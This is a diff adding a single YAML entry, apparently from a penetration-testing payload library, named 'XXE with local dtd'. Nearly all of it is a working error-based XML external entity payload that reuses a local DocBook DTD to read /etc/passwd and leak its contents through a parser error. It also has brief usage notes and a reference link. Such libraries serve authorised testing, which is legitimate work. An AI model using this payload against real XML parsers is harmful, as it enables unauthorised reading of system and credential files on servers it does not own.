@@ -1,0 +1,14 @@
+name: XXE with local dtd
+description: This requires a local dtd file. See references for a wordlist.
+commands:
+  - command: |
+      <!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> <!ENTITY % ISOamsb '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"><!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval; &#x25;error;'> %local_dtd;%ISOamsb;]>
+    description: Error based dtd attack, it is important to encode %, & and % for the second entity.
+tags:
+  - xxe
+  - lfi
+show:
+links:
+  -
+references:
+  - https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/
